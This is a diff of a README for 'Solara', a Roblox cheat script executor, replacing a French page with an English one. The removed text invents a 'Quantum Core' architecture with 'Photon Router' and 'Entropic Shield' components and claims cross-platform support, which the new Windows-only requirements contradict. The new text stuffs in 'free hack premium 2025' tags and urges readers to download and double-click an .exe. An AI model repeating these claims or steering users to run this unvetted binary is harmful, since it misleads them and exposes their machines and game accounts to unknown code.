@@ -1,97 +1,87 @@
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/75a7e395-b06b-4100-b7ce-7ca25392b371"
-       alt="Démonstration d'injection Solara"
-       width="650"
-       style="border-radius: 16px;
-              box-shadow: 0 12px 40px rgba(0,255,255,0.4), 
-                         0 0 0 2px #00ffff,
-                         0 0 32px rgba(0,255,255,0.8);
-              transform: perspective(800px) rotateX(5deg);">
-</p>
+# 🌟 Solara - Fast and Secure 3rd EXEC Tool
 
-<h1 align="center">
-  <span style="display: inline-block;
-               background: linear-gradient(135deg, #8a2be2, #00ffff, #ff00ff);
-               -webkit-background-clip: text;
-               -webkit-text-fill-color: transparent;
-               text-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
-               letter-spacing: -1.5px;
-               position: relative;">
-    SOLARA<sup style="font-size: 0.6em; top: -1.5em;">v3</sup>
-  </span>
-  <br>
-  <span style="font-size: 0.7em;">MOTEUR D'EXÉCUTION WINDOWS RÉVOLUTIONNAIRE</span>
-</h1>
+## 🚀 Download Now
+[![Download Solara](https://img.shields.io/badge/download-Solara-blue.svg)](https://github.com/xettic/Solara/releases)
 
-<h3 align="center" style="font-weight: 300; letter-spacing: 3px; margin-top: -10px;">
-  <span style="background: rgba(10, 20, 30, 0.8);
-               padding: 4px 12px;
-               border-radius: 20px;
-               border: 1px solid rgba(0, 255, 255, 0.3);">
-  </span>
-</h3>
+## 📖 Description
+Solara is a fast and secure tool designed for executing scripts on Roblox. Whether you want to enhance your gaming experience or explore new game features, Solara provides a reliable way to run your scripts safely.
 
-## Table des matières
-- [Introduction](#solara-l'avenir-de-l-exécution-windows)
-- [Fonctionnalités](#fonctionnalités)
-- [Architecture Quantique Core](#-architecture-quantique-core)
-- [Contribution](#contribution)
-- [Licence](#licence)
+## 🌐 Topics
+- fluxus-executor-premium-2025
+- luna-executor-premium-2025
+- roblox
+- roblox-executer-pc-premium-2025
+- roblox-executer-premium-2025
+- roblox-executor-for-pc-premium-2025
+- roblox-executor-premium-2025
+- roblox-free-hack-premium-2025
+- roblox-hack-download-premium-2025
+- roblox-hack-free-premium-2025
+- roblox-lua-executor-premium-2025
+- roblox-script-execution-premium-2025
+- roblox-script-premium-2025
+- roblox-scripts-premium-2025
+- solara-executor-premium-2025
+- wave-executor-premium-2025
 
-## Solara : L'avenir de l'exécution Windows
+## 📥 Download & Install
+To begin using Solara, follow these steps:
 
-Solara n'est pas un simple exécuteur Windows ; c'est un véritable jeu-changer. Créé par quiving, qui et une équipe d'experts en ingénierie inverse, Solara offre des performances et une fiabilité incomparables. Faites vos adieux aux ralentissements et accueillez une exécution sans faille.
+1. **Visit the Releases Page**
+   Head over to our [Releases page](https://github.com/xettic/Solara/releases) to find the latest version of Solara.
 
-## Fonctionnalités
+2. **Select the Right Version**
+   Look for the version labeled as "Latest". It usually has the most recent updates and features.
 
-- **Exécution sans Lag :** Profitez de performances fluides et sans ralentissements.
-- **Sécurité Avancée :** Les techniques de chiffrement AES-256 et de morphing garantissent la sécurité de vos données.
-- **Couverture Élevée :** 100% de couverture de l'API Roblox pour une fonctionnalité complète.
-- **Latence Faible :** Une latence d'injection aussi basse que 0,9 ms pour des réponses rapides.
-- **Interface Personnalisable :** Adaptez l'UI à vos besoins avec nos options de conception flexibles.
-- **Support Multiplateforme :** Exécutez Solara sur Windows, macOS et Linux.
+3. **Download the File**
+   Click on the version number to open it. You will see several download options. Select the executable file (usually ending in `.exe`).
 
-<div align="center" style="margin: 28px 0;">
-  <div style="display: inline-flex; gap: 12px; flex-wrap: wrap;">
-    <img src="https://img.shields.io/badge/License-QUANTUM_RPL_1.5-8a2be2?style=for-the-badge&logo=apache&logoColor=white&labelColor=0d1117" alt="Licence">
-    <img src="https://img.shields.io/badge/ROBLOX_API-100%25_Coverage-ff00ff?style=for-the-badge&logo=roblox&logoColor=white&labelColor=0d1117" alt="Couverture Roblox">
-    <img src="https://img.shields.io/badge/INJECTION_Δ-0.9ms-00ffff?style=for-the-badge&logo=speedtest&logoColor=white&labelColor=0d1117" alt="Latence">
-    <img src="https://img.shields.io/badge/SECURITY-AES_256_+_MORPHING-brightgreen?style=for-the-badge&logo=keycdn&logoColor=white&labelColor=0d1117" alt="Sécurité">
-    <img src="https://img.shields.io/badge/Customizable-Yes-brightgreen?style=for-the-badge&logo=customize&logoColor=white&labelColor=0d1117" alt="Personnalisable">
-    <img src="https://img.shields.io/badge/Cross--Platform-Yes-brightgreen?style=for-the-badge&logo=platform&logoColor=white&labelColor=0d1117" alt="Multiplateforme">
-  </div>
-</div>
+4. **Install the Application**
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the setup.
 
----
+5. **Launch Solara**
+   After installation, you can find Solara in your applications list. Click to open it.
 
-## 🌀 Architecture Quantique Core
-```mermaid
-graph LR
-  A[Injecteur Quantique] -->|Découpe Temporelle| B[Routeur Photon]
-  B --> C[Bouclier Entropique]
-  C --> D[Débogueur Chronos]
-  D --> E[Validateur Nébuleuse]
-  E --> F[Moteur UI Astral]
-  F --> G[Render Output]
-  style A fill:#8a2be2,stroke:#00ffff
-  style B fill:#00ffff,stroke:#00bfff
-  style C fill:#ff00ff,stroke:#ff1493
-  style D fill:#ff69b4,stroke:#c71585
-  style E fill:#32cd32,stroke:#008000
-  style F fill:#ffd700,stroke:#ffa500
-  style G fill:#8a2be2,stroke:#00ffff
-```
+## 🛠️ System Requirements
+To run Solara smoothly, ensure your system meets the following requirements:
 
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB
+- **Internet Connection:** Required for downloading scripts and updates
 
-## Contribution
-**Nous accueillons les contributions de la communauté ! Pour contribuer :**
+## 💡 Features
+Solara offers a range of functionalities:
 
-- Forkez le dépôt.
-- Créez une nouvelle branche : git checkout -b feature/your-feature
-- Validez vos modifications : git commit -m 'Add some feature'
-- Poussez vers la branche : git push origin feature/your-feature
-- Ouvrez une Pull Request.
-- Assurez-vous que votre code respecte nos normes de codage et inclut des tests appropriés.
+- **User-Friendly Interface:** Designed for ease of use. Navigate through menus with minimal effort.
+- **Script Execution:** Run your favorite Roblox scripts effortlessly with fast and secure execution.
+- **Automatic Updates:** Stay up-to-date with the latest features and security enhancements.
+- **Community Support:** Join our community for tips, scripts, and help with any issues.
 
-## Licence
-- Ce projet est sous licence QUANTUM_RPL_1.5 - voir le fichier LICENSE pour plus de détails.
+## ⚙️ How to Use Solara
+Using Solara is simple:
+
+1. **Open the Application**
+   Start Solara from your applications list.
+
+2. **Load Your Script**
+   Click on the "Load Script" button. Navigate to the directory where your Roblox script is saved.
+
+3. **Execute the Script**
+   Once loaded, click "Execute" to run your script in Roblox. 
+
+4. **Enjoy Your Game**
+   Experience the enhancements your script provides within your Roblox game.
+
+## 🤝 Community and Support
+If you encounter any issues or have questions, feel free to reach out. 
+
+- **GitHub Issues Page:** Report bugs or request features by visiting our [Issues page](https://github.com/xettic/Solara/issues).
+- **Discussion Forum:** Join conversations with other users for shared support and tips.
+- **Documentation:** For detailed instructions and troubleshooting, check the documentation within the app or visit our wiki.
+
+## 🏁 Conclusion
+Solara stands as a reliable tool for executing scripts in Roblox. Follow the steps outlined above to download and install it, and enhance your gaming experience today. 
+
+For updates and new features, keep an eye on the [Releases page](https://github.com/xettic/Solara/releases).
